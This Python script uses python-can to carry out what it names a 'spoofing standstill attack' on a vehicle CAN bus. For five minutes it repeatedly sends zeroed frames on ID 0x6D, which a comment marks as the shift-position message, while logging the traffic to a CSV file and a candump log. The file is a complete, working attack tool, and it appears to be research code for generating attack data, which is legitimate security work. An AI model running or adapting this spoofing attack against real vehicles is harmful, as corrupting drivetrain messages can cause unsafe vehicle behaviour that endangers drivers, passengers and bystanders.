import can
import time
import random
import csv
import os
from threading import Thread
from check_can_status import check_can0_status, restart_can0

# Initialize CAN interface
bus = can.interface.Bus(channel='can0', bustype='socketcan', bitrate=500000)

# Define the attack duration
attack_duration = 300  # Duration of the attack in seconds

# File to log the attack messages
attack_log_file = 'standstill_attack_log.csv'

def spoofing_standstill_attack():

    attack_start_time = time.time()
    attack_end_time = attack_start_time + attack_duration

    with open(attack_log_file, 'w', newline='') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(['Timestamp', 'ID', 'Data'])

        while time.time() <= attack_end_time:
            # ID of shift position
            msg = can.Message(arbitration_id=0x6D, data=[0x00] * 8, is_extended_id=False)
            
            # Send CAN message
            bus.send(msg)

            # Loging
            timestamp = time.time()
            csv_writer.writerow([timestamp, hex(msg.arbitration_id), ''.join(format(x, '02x') for x in msg.data)])

            time.sleep(0.01)  # Small delay to prevent overwhelming the hardware

            if not check_can0_status():
                restart_can0()
                # Recheck the status to ensure it is up
                if check_can0_status():
                    print("can0 is now up and running.")
                else:
                    print("Failed to bring can0 up.")

        restart_can0()


def log_can_messages():
    os.system('candump can0 -L > spoofing_standstill_attack.log')


if __name__ == "__main__":

    attack_thread = Thread(target=spoofing_standstill_attack)
    logging_thread = Thread(target=log_can_messages)

    attack_thread.start()
    logging_thread.start()

    attack_thread.join()
    logging_thread.join()

